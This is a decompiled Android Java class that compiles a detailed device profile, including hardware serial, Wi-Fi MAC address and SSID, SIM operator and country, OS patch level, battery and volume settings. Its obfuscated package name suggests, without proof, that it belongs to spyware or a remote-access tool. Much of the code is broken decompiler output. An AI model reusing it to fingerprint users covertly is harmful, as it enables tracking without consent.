/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.app.ActivityManager
 *  android.app.ActivityManager$MemoryInfo
 *  android.app.usage.StorageStatsManager
 *  android.content.ContentResolver
 *  android.content.Context
 *  android.content.IntentFilter
 *  android.media.AudioManager
 *  android.net.ConnectivityManager
 *  android.net.wifi.WifiManager
 *  android.os.Build
 *  android.os.Build$VERSION
 *  android.os.Environment
 *  android.os.PowerManager
 *  android.os.StatFs
 *  android.os.SystemClock
 *  android.os.storage.StorageManager
 *  android.provider.Settings$Global
 *  android.telephony.TelephonyManager
 *  android.util.DisplayMetrics
 *  android.view.WindowManager
 */
package linker.resourcer.encoder;

import android.app.ActivityManager;
import android.app.usage.StorageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.IntentFilter;
import android.media.AudioManager;
import android.net.ConnectivityManager;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Environment;
import android.os.PowerManager;
import android.os.StatFs;
import android.os.SystemClock;
import android.os.storage.StorageManager;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import android.view.WindowManager;
import java.util.Locale;
import java.util.TimeZone;
import java.util.UUID;
import linker.resourcer.encoder.ConfigurationConstants;
import linker.resourcer.encoder.UtilityHelper;

public class DeviceInformationCollector {
    private static final String NA = "n/a";

    /*
     * Unable to fully structure code
     */
    public static String Devicename(Context var0) {
        block7: {
            var2_3 = "";
            try {
                var0 = Settings.Global.getString((ContentResolver)var0.getContentResolver(), (String)"device_name");
            }
            catch (Exception var0_1) {
                var0 = var2_3;
            }
            if (var0 == null) ** GOTO lbl11
            var2_3 = var0;
            try {
                block8: {
                    if (var0.length() != 0) break block8;
lbl11:
                    // 2 sources

                    var2_3 = Build.MODEL;
                }
                if (var2_3 == null) break block7;
            }
            catch (Exception var0_2) {
                return "n/a";
            }
            var1_4 = var2_3.length();
            if (var1_4 == 0) break block7;
            return var2_3;
        }
        return "n/a";
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    public static String Load(Context var0) {
        block86: {
            block90: {
                block85: {
                    block84: {
                        block83: {
                            block88: {
                                block82: {
                                    block81: {
                                        block79: {
                                            block80: {
                                                block78: {
                                                    block76: {
                                                        block75: {
                                                            block74: {
                                                                var28_20 = new StringBuilder();
                                                                var29_21 = var0.getApplicationContext();
                                                                var28_20.append("\u2022 [Information]" + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("Name: " + DeviceInformationCollector.safe(DeviceInformationCollector.Devicename(var29_21)) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("MODEL: " + DeviceInformationCollector.safe(Build.MODEL) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("BOARD: " + DeviceInformationCollector.safe(Build.BOARD) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("BRAND: " + DeviceInformationCollector.safe(Build.BRAND) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("PRODUCT: " + DeviceInformationCollector.safe(Build.PRODUCT) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("DEVICE: " + DeviceInformationCollector.safe(Build.DEVICE) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("TYPE: " + DeviceInformationCollector.safe(Build.TYPE) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("BOOTLOADER: " + DeviceInformationCollector.safe(Build.BOOTLOADER) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("DISPLAY: " + DeviceInformationCollector.safe(Build.DISPLAY) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("HARDWARE: " + DeviceInformationCollector.safe(Build.HARDWARE) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("HOST: " + DeviceInformationCollector.safe(Build.HOST) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("ID: " + DeviceInformationCollector.safe(Build.ID) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("MANUFACTURER: " + DeviceInformationCollector.safe(Build.MANUFACTURER) + ConfigurationConstants.SPLIT_LINE);
                                                                try {
                                                                    var0 = Build.VERSION.SDK_INT >= 26 ? Build.getSerial() : Build.SERIAL;
                                                                }
                                                                catch (Throwable var0_1) {
                                                                    var0 = "n/a";
                                                                }
                                                                catch (SecurityException var0_2) {
                                                                    var0 = "n/a";
                                                                }
                                                                var28_20.append("SERIAL: " + DeviceInformationCollector.safe((String)var0) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("----------------" + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("\u2022 [System]" + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("Version: " + DeviceInformationCollector.safe(UtilityHelper.Version()) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("RELEASE: " + DeviceInformationCollector.safe(Build.VERSION.RELEASE) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("SDK: " + Build.VERSION.SDK_INT + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("Language: " + DeviceInformationCollector.safe(Locale.getDefault().getDisplayLanguage()) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("Security Patch: " + DeviceInformationCollector.safe(Build.VERSION.SECURITY_PATCH) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("Time Zone: " + DeviceInformationCollector.safe(TimeZone.getDefault().getID()) + ConfigurationConstants.SPLIT_LINE);
                                                                var15_22 = SystemClock.elapsedRealtime();
                                                                var28_20.append("Uptime: " + DeviceInformationCollector.formatDuration(var15_22) + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("----------------" + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                                                var28_20.append("\u2022 [Memory]" + ConfigurationConstants.SPLIT_LINE);
                                                                try {
                                                                    var24_23 = (ActivityManager)var29_21.getSystemService("activity");
                                                                    if (var24_23 != null) {
                                                                        var0 = new ActivityManager.MemoryInfo();
                                                                        var24_23.getMemoryInfo((ActivityManager.MemoryInfo)var0);
                                                                        var24_23 = new StringBuilder();
                                                                    }
                                                                    ** GOTO lbl96
                                                                }
                                                                catch (Throwable var0_5) {
                                                                    // empty catch block
                                                                    break block74;
                                                                }
                                                                var24_23 = var24_23.append("RAM Total: ");
                                                                {
                                                                    catch (Throwable var0_3) {
                                                                        break block74;
                                                                    }
                                                                    ** try [egrp 3[TRYBLOCK] [7 : 1077->1282)] { 
lbl87:
                                                                    // 1 sources

                                                                    var28_20.append(var24_23.append(DeviceInformationCollector.formatSize(var0.totalMem)).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                                    var24_23 = new StringBuilder();
                                                                    var28_20.append(var24_23.append("RAM Available: ").append(DeviceInformationCollector.formatSize(var0.availMem)).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                                    var24_23 = new StringBuilder();
                                                                    var28_20.append(var24_23.append("RAM Low: ").append(var0.lowMemory).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                                    break block75;
lbl96:
                                                                    // 1 sources

                                                                    var0 = new StringBuilder();
                                                                    var28_20.append(var0.append("RAM Total: n/a").append(ConfigurationConstants.SPLIT_LINE).toString());
                                                                    var0 = new StringBuilder();
                                                                    var28_20.append(var0.append("RAM Available: n/a").append(ConfigurationConstants.SPLIT_LINE).toString());
                                                                    var0 = new StringBuilder();
                                                                    var28_20.append(var0.append("RAM Low: n/a").append(ConfigurationConstants.SPLIT_LINE).toString());
                                                                    break block75;
                                                                }
lbl106:
                                                                // 1 sources

                                                                catch (Throwable var0_4) {}
                                                            }
                                                            var28_20.append("RAM Total: n/a" + ConfigurationConstants.SPLIT_LINE);
                                                            var28_20.append("RAM Available: n/a" + ConfigurationConstants.SPLIT_LINE);
                                                            var28_20.append("RAM Low: n/a" + ConfigurationConstants.SPLIT_LINE);
                                                        }
                                                        var28_20.append("----------------" + ConfigurationConstants.SPLIT_LINE);
                                                        var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                                        var28_20.append("\u2022 [Storage]" + ConfigurationConstants.SPLIT_LINE);
                                                        var21_30 = 0L;
                                                        var19_31 = 0L;
                                                        try {
                                                            block87: {
                                                                if (Build.VERSION.SDK_INT < 26) break block87;
                                                                var24_23 = (StorageManager)var29_21.getSystemService("storage");
                                                                var0 = (StorageStatsManager)var29_21.getSystemService("storagestats");
                                                                var17_32 = var21_30;
                                                                var15_22 = var19_31;
                                                                if (var24_23 == null) ** GOTO lbl-1000
                                                                var17_32 = var21_30;
                                                                var15_22 = var19_31;
                                                                if (var0 == null) ** GOTO lbl-1000
                                                                var24_23 = var24_23.getUuidForPath(Environment.getDataDirectory());
                                                                var17_32 = var0.getTotalBytes((UUID)var24_23);
                                                                var15_22 = var0.getFreeBytes((UUID)var24_23);
                                                                ** GOTO lbl-1000
                                                            }
                                                            var0 = Environment.getDataDirectory();
                                                            var24_23 = new StatFs(var0.getAbsolutePath());
                                                            var19_31 = var24_23.getBlockSizeLong();
                                                            var17_32 = var24_23.getBlockCountLong();
                                                            var15_22 = var24_23.getAvailableBlocksLong();
                                                            var17_32 *= var19_31;
                                                            var15_22 *= var19_31;
                                                        }
                                                        catch (Throwable var0_6) {
                                                            var28_20.append("Total: n/a" + ConfigurationConstants.SPLIT_LINE);
                                                            var28_20.append("Used: n/a" + ConfigurationConstants.SPLIT_LINE);
                                                            var28_20.append("Free: n/a" + ConfigurationConstants.SPLIT_LINE);
                                                            break block76;
                                                        }
lbl-1000:
                                                        // 4 sources

                                                        {
                                                            var0 = new StringBuilder();
                                                            var28_20.append(var0.append("Total: ").append(DeviceInformationCollector.formatSize(var17_32)).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                            var0 = new StringBuilder();
                                                            var28_20.append(var0.append("Used: ").append(DeviceInformationCollector.formatSize(var17_32 - var15_22)).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                            var0 = new StringBuilder();
                                                            var28_20.append(var0.append("Free: ").append(DeviceInformationCollector.formatSize(var15_22)).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                        }
                                                    }
                                                    var28_20.append("----------------" + ConfigurationConstants.SPLIT_LINE);
                                                    var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                                    var28_20.append("\u2022 [Screen]" + ConfigurationConstants.SPLIT_LINE);
                                                    try {
                                                        var0 = (WindowManager)var29_21.getSystemService("window");
                                                        if (var0 != null) {
                                                            var24_23 = var0.getDefaultDisplay();
                                                            var0 = new DisplayMetrics();
                                                            var24_23.getRealMetrics((DisplayMetrics)var0);
                                                            var24_23 = new StringBuilder();
                                                            var28_20.append(var24_23.append("Resolution: ").append(var0.widthPixels).append("x").append(var0.heightPixels).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                            var24_23 = new StringBuilder();
                                                            var28_20.append(var24_23.append("Density: ").append(var0.densityDpi).append(" dpi").append(ConfigurationConstants.SPLIT_LINE).toString());
                                                        } else {
                                                            var0 = new StringBuilder();
                                                            var28_20.append(var0.append("Resolution: n/a").append(ConfigurationConstants.SPLIT_LINE).toString());
                                                            var0 = new StringBuilder();
                                                            var28_20.append(var0.append("Density: n/a").append(ConfigurationConstants.SPLIT_LINE).toString());
                                                        }
                                                    }
                                                    catch (Throwable var0_7) {
                                                        var28_20.append("Resolution: n/a" + ConfigurationConstants.SPLIT_LINE);
                                                        var28_20.append("Density: n/a" + ConfigurationConstants.SPLIT_LINE);
                                                    }
                                                    var28_20.append("----------------" + ConfigurationConstants.SPLIT_LINE);
                                                    var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                                    var28_20.append("\u2022 [SIM]" + ConfigurationConstants.SPLIT_LINE);
                                                    var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                                    var25_33 = (TelephonyManager)var29_21.getSystemService("phone");
                                                    if (var25_33 != null) {
                                                        try {
                                                            var0 = var24_23 = DeviceInformationCollector.safe(var25_33.getNetworkOperatorName());
                                                            if (var24_23.trim().length() == 0) {
                                                                var0 = "n/a";
                                                            }
                                                            var24_23 = new StringBuilder();
                                                            var28_20.append(var24_23.append("Operator: ").append((String)var0).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                            var0 = var24_23 = DeviceInformationCollector.safe(var25_33.getSimCountryIso());
                                                            if (var24_23.trim().length() == 0) {
                                                                var0 = "n/a";
                                                            }
                                                            var24_23 = new StringBuilder();
                                                            var28_20.append(var24_23.append("Country: ").append((String)var0).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                            var0 = new StringBuilder();
                                                            var28_20.append(var0.append("Network: ").append(DeviceInformationCollector.safe(UtilityHelper.Get_Network(var29_21))).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                        }
                                                        catch (Throwable var0_8) {
                                                            DeviceInformationCollector.appendNA(var28_20, 3);
                                                        }
                                                        catch (SecurityException var0_9) {
                                                            DeviceInformationCollector.appendNA(var28_20, 3);
                                                        }
                                                    } else {
                                                        DeviceInformationCollector.appendNA(var28_20, 3);
                                                    }
                                                    var28_20.append("----------------" + ConfigurationConstants.SPLIT_LINE);
                                                    var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                                    var28_20.append("\u2022 WIFI" + ConfigurationConstants.SPLIT_LINE);
                                                    var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                                    var25_33 = (WifiManager)var29_21.getSystemService("wifi");
                                                    var0 = (ConnectivityManager)var29_21.getSystemService("connectivity");
                                                    if (var0 != null) {
                                                        try {
                                                            var0 = var0.getActiveNetworkInfo();
                                                            break block78;
                                                        }
                                                        catch (Throwable var0_10) {
                                                            break block79;
                                                        }
                                                    }
                                                    var0 = null;
                                                }
                                                if (var0 != null) {
                                                    try {
                                                        if (!var0.isConnected() || (var1_34 = var0.getType()) != 1 || var25_33 == null) break block80;
                                                        var0 = "n/a";
                                                        var24_23 = "n/a";
                                                        var2_35 = 0;
                                                        var1_34 = 0;
                                                    }
                                                    catch (Throwable var0_14) {
                                                        break block79;
                                                    }
                                                    try {
                                                        var25_33 = var25_33.getConnectionInfo();
                                                        if (var25_33 != null) {
                                                            var0 = DeviceInformationCollector.safe(var25_33.getMacAddress());
                                                            var24_23 = DeviceInformationCollector.safe(var25_33.getSSID());
                                                            var2_35 = var25_33.getLinkSpeed();
                                                            var1_34 = WifiManager.calculateSignalLevel((int)var25_33.getRssi(), (int)5);
                                                        }
lbl265:
                                                        // 4 sources

                                                        while (true) {
                                                            var3_36 = var2_35;
                                                            var2_35 = var1_34;
                                                            var1_34 = var3_36;
                                                            break;
                                                        }
                                                    }
                                                    catch (Throwable var0_11) {
                                                        var0 = "n/a";
                                                        var24_23 = "n/a";
                                                        var1_34 = 0;
                                                        var2_35 = 0;
                                                    }
                                                    catch (SecurityException var0_12) {
                                                        var0 = "n/a";
                                                        var24_23 = "n/a";
                                                        var2_35 = 0;
                                                        var1_34 = 0;
                                                        ** continue;
                                                    }
                                                    {
                                                        var25_33 = new StringBuilder();
                                                    }
                                                    try {
                                                        var28_20.append(var25_33.append("MacAddress: ").append((String)var0).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                        var0 = new StringBuilder();
                                                        var28_20.append(var0.append("SSID: ").append((String)var24_23).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                        var0 = new StringBuilder();
                                                        var28_20.append(var0.append("LinkSpeed: ").append(var1_34).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                        var0 = new StringBuilder();
                                                        var28_20.append(var0.append("RSSI: ").append(var2_35).append(ConfigurationConstants.SPLIT_LINE).toString());
                                                    }
                                                    catch (Throwable var0_13) {
                                                        break block79;
                                                    }
                                                }
                                            }
                                            try {
                                                DeviceInformationCollector.appendNA(var28_20, 4);
                                                break block81;
                                            }
                                            catch (Throwable var0_15) {
                                                // empty catch block
                                            }
                                        }
                                        DeviceInformationCollector.appendNA(var28_20, 4);
                                    }
                                    var28_20.append("----------------" + ConfigurationConstants.SPLIT_LINE);
                                    var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                    var28_20.append("\u2022 Battery" + ConfigurationConstants.SPLIT_LINE);
                                    var28_20.append(" " + ConfigurationConstants.SPLIT_LINE);
                                    try {
                                        var0 = new IntentFilter("android.intent.action.BATTERY_CHANGED");
                                        var0 = var29_21.registerReceiver(null, (IntentFilter)var0);
                                        if (var0 != null) {
                                            var2_35 = -1;
                                            var5_37 = var0.getIntExtra("level", -1);
                                            var4_38 = var0.getIntExtra("scale", 100);
                                            var3_36 = var0.getIntExtra("plugged", -1);
                                            var1_34 = var2_35;
                                            if (var5_37 < 0) break block82;
                                            var1_34 = var2_35;
                                            if (var4_38 <= 0) break block82;
                                        }
                                        ** GOTO lbl359
                                    }
                                    catch (Throwable var0_18) {
                                        // empty catch block
                                        break block83;
                                    }
                                    try {
                                        var1_34 = var5_37 * 100 / var4_38;
                                    }
                                    catch (Throwable var0_16) {
                                        break block83;
                                    }
                                }
                                if (var3_36 == 1 || var3_36 == 2) break block88;
                                var23_39 = false;
                                ** GOTO lbl-1000
                            }
                            var23_39 = true;
lbl-1000:
                            // 2 sources

                            {
                                var0 = new StringBuilder();
                                var24_23 = var0.append("Charged: ");
                                if (var1_34 < 0) ** GOTO lbl351
                                var0 = new StringBuilder();
                                var0 = var0.append(var1_34);
                            }
                            try {
                                block89: {
                                    var0 = var0.append("%").toString();
                                    break block89;
lbl351:
                                    // 1 sources

                                    var0 = "n/a";
                                }
                                var28_20.append(var24_23.append((String)var0).append(ConfigurationConstants.SPLIT_LINE).toString());
                                var0 = new StringBuilder();
                                var28_20.append(var0.append("USB: ").append(var23_39).append(ConfigurationConstants.SPLIT_LINE).toString());
                                break block84;
lbl359:
                                // 1 sources

                                var0 = new StringBuilder();
                                var28_20.append(var0.append("Charged: n/a").append(ConfigurationConstants.SPLIT_LINE).toString());
                                var0 = new StringBuilder();
                                var28_20.append(var0.append("USB: n/a").append(ConfigurationConstants.SPLIT_LINE).toString());
                                break block84;
                            }
                            catch (Throwable var0_17) {}
                        }
                        var28_20.append("Charged: n/a" + ConfigurationConstants.SPLIT_LINE);
                        var28_20.append("USB: n/a" + ConfigurationConstants.SPLIT_LINE);
                    }
                    var0 = (PowerManager)var29_21.getSystemService("power");
                    if (var0 != null) {
                        try {
                            var24_23 = new StringBuilder();
                            var28_20.append(var24_23.append("Sleep mode: ").append(var0.isDeviceIdleMode()).append(ConfigurationConstants.SPLIT_LINE).toString());
                            var24_23 = new StringBuilder();
                            var28_20.append(var24_23.append("Power Saver: ").append(var0.isPowerSaveMode()).append(ConfigurationConstants.SPLIT_LINE).toString());
                            var24_23 = new StringBuilder();
                            var28_20.append(var24_23.append("Active: ").append(var0.isInteractive()).append(ConfigurationConstants.SPLIT_LINE).toString());
                        }
                        catch (Throwable var0_19) {
                            var28_20.append("Sleep mode: n/a" + ConfigurationConstants.SPLIT_LINE);
                            var28_20.append("Power Saver: n/a" + ConfigurationConstants.SPLIT_LINE);
                            var28_20.append("Active: n/a" + ConfigurationConstants.SPLIT_LINE);
                        }
                    } else {
                        var28_20.append("Sleep mode: n/a" + ConfigurationConstants.SPLIT_LINE);
                        var28_20.append("Power Saver: n/a" + ConfigurationConstants.SPLIT_LINE);
                        var28_20.append("Active: n/a" + ConfigurationConstants.SPLIT_LINE);
                    }
                    var2_35 = -1;
                    var3_36 = -1;
                    var4_38 = -1;
                    var5_37 = -1;
                    var6_40 = -1;
                    var7_41 = -1;
                    var14_42 = -1;
                    var25_33 = "n/a";
                    var28_20.append("----------------").append(ConfigurationConstants.SPLIT_LINE);
                    var28_20.append(" ").append(ConfigurationConstants.SPLIT_LINE);
                    var28_20.append("\u2022 Settings").append(ConfigurationConstants.SPLIT_LINE);
                    var28_20.append(" ").append(ConfigurationConstants.SPLIT_LINE);
                    var24_23 = (AudioManager)var29_21.getSystemService("audio");
                    var26_43 = "1";
                    var27_44 = "0";
                    if (var24_23 == null) break block90;
                    try {
                        var1_34 = var24_23.getStreamMaxVolume(2);
                    }
                    catch (Throwable var24_29) {
                        var1_34 = -1;
                        var0 = var25_33;
                        var8_45 = var14_42;
                        break block85;
                    }
                    try {
                        var2_35 = var8_45 = var24_23.getStreamVolume(2);
                    }
                    catch (Throwable var24_28) {
                        var8_45 = var14_42;
                        var0 = var25_33;
                        break block85;
                    }
                    try {
                        var0 = var28_20.append(var1_34);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                    }
                    catch (Throwable var24_27) {
                        var8_45 = var14_42;
                        var0 = var25_33;
                        break block85;
                    }
                    try {
                        var0.append(ConfigurationConstants.SPLIT_LINE);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var28_20.append(var2_35).append(ConfigurationConstants.SPLIT_LINE);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var12_46 = var3_36 = var24_23.getStreamMaxVolume(3);
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var4_38 = var24_23.getStreamVolume(3);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var28_20.append(var3_36).append(ConfigurationConstants.SPLIT_LINE);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var28_20.append(var4_38).append(ConfigurationConstants.SPLIT_LINE);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var5_37 = var24_23.getStreamMaxVolume(5);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var6_40 = var24_23.getStreamVolume(5);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var28_20.append(var5_37).append(ConfigurationConstants.SPLIT_LINE);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var28_20.append(var6_40).append(ConfigurationConstants.SPLIT_LINE);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var7_41 = var24_23.getStreamMaxVolume(1);
                        var12_46 = var3_36;
                        var11_47 = var4_38;
                        var10_48 = var5_37;
                        var9_49 = var6_40;
                        var8_45 = var7_41;
                        var13_50 = var24_23.getStreamVolume(1);
                    }
                    catch (Throwable var24_26) {
                        var3_36 = var12_46;
                        var4_38 = var11_47;
                        var5_37 = var10_48;
                        var6_40 = var9_49;
                        var7_41 = var8_45;
                        var8_45 = var14_42;
                        var0 = var25_33;
                        break block85;
                    }
                    try {
                        var30_51 = var28_20.append(var7_41);
                        var0 = var25_33;
                    }
                    catch (Throwable var24_25) {
                        var8_45 = var13_50;
                        var0 = var25_33;
                        break block85;
                    }
                    try {
                        block91: {
                            var30_51.append(ConfigurationConstants.SPLIT_LINE);
                            var0 = var25_33;
                            var28_20.append(var13_50).append(ConfigurationConstants.SPLIT_LINE);
                            var0 = var25_33;
                            switch (var24_23.getRingerMode()) {
                                default: {
                                    break;
                                }
                                case 2: {
                                    var0 = var24_23 = "0";
                                    var28_20.append("0").append(ConfigurationConstants.SPLIT_LINE);
                                    var0 = var24_23;
                                    break block91;
                                }
                                case 1: {
                                    var0 = var24_23 = "1";
                                    var28_20.append("1").append(ConfigurationConstants.SPLIT_LINE);
                                    var0 = var24_23;
                                    break block91;
                                }
                                case 0: {
                                    var0 = var24_23 = "2";
                                    var28_20.append("2").append(ConfigurationConstants.SPLIT_LINE);
                                    var0 = var24_23;
                                    break block91;
                                }
                            }
                            var0 = var24_23 = "n/a";
                            var28_20.append("n/a").append(ConfigurationConstants.SPLIT_LINE);
                            var0 = var24_23;
                        }
                        var8_45 = var1_34;
                        var25_33 = "0";
                        var1_34 = var13_50;
                        var24_23 = var0;
                        var0 = var25_33;
                        break block86;
                    }
                    catch (Throwable var24_24) {
                        var8_45 = var13_50;
                    }
                }
                var10_48 = 0;
                var9_49 = var1_34;
                var25_33 = var27_44;
                for (var1_34 = var10_48; var1_34 < 9; ++var1_34) {
                    var28_20.append("n/a").append(ConfigurationConstants.SPLIT_LINE);
                }
                var1_34 = var8_45;
                var24_23 = var0;
                var8_45 = var9_49;
                var0 = var25_33;
                break block86;
            }
            var0 = "0";
            for (var1_34 = 0; var1_34 < 9; ++var1_34) {
                var28_20.append("n/a").append(ConfigurationConstants.SPLIT_LINE);
            }
            var1_34 = -1;
            var24_23 = "n/a";
            var8_45 = -1;
        }
        var25_33 = (WifiManager)var29_21.getSystemService("wifi");
        if (var25_33 != null) {
            var23_39 = var25_33.isWifiEnabled();
            var25_33 = var23_39 != false ? "1" : var0;
            if (var23_39) {
                var0 = var26_43;
            }
            var28_20.append((String)var0).append(ConfigurationConstants.SPLIT_LINE);
        } else {
            var28_20.append("n/a").append(ConfigurationConstants.SPLIT_LINE);
            var25_33 = "n/a";
        }
        var28_20.append("##META##").append(ConfigurationConstants.SPLIT_LINE);
        var28_20.append("RING_MAX=").append(var8_45).append(ConfigurationConstants.SPLIT_LINE);
        var28_20.append("RING_VOL=").append(var2_35).append(ConfigurationConstants.SPLIT_LINE);
        var28_20.append("MUSIC_MAX=").append(var3_36).append(ConfigurationConstants.SPLIT_LINE);
        var28_20.append("MUSIC_VOL=").append(var4_38).append(ConfigurationConstants.SPLIT_LINE);
        var28_20.append("NOTIFY_MAX=").append(var5_37).append(ConfigurationConstants.SPLIT_LINE);
        var28_20.append("NOTIFY_VOL=").append(var6_40).append(ConfigurationConstants.SPLIT_LINE);
        var28_20.append("SYS_MAX=").append(var7_41).append(ConfigurationConstants.SPLIT_LINE);
        var28_20.append("SYS_VOL=").append(var1_34).append(ConfigurationConstants.SPLIT_LINE);
        var28_20.append("SOUND_STATE=").append((String)var24_23).append(ConfigurationConstants.SPLIT_LINE);
        var28_20.append("WIFI_ENABLED=").append((String)var25_33).append(ConfigurationConstants.SPLIT_LINE);
        return var28_20.toString();
    }

    private static void appendNA(StringBuilder stringBuilder, int n) {
        for (int i = 0; i < n; ++i) {
            stringBuilder.append(NA).append(ConfigurationConstants.SPLIT_LINE);
        }
    }

    private static String formatDuration(long l) {
        long l2 = l / 1000L;
        l = l2 / 86400L;
        long l3 = l2 % 86400L;
        l2 = l3 / 3600L;
        long l4 = (l3 %= 3600L) / 60L;
        return l + "d " + l2 + "h " + l4 + "m " + l3 % 60L + "s";
    }

    private static String formatSize(long l) {
        double d;
        if (l <= 0L) {
            return "0 B";
        }
        String[] stringArray = new String[]{"B", "KB", "MB", "GB", "TB"};
        int n = 0;
        for (d = (double)l; d >= 1024.0 && n < stringArray.length - 1; d /= 1024.0, ++n) {
        }
        return String.format(Locale.US, "%.2f %s", d, stringArray[n]);
    }

    private static String safe(String string2) {
        block1: {
            String string3 = NA;
            if (string2 == null) {
                return NA;
            }
            if ((string2 = string2.trim()).length() != 0) break block1;
            string2 = string3;
        }
        return string2;
    }
}

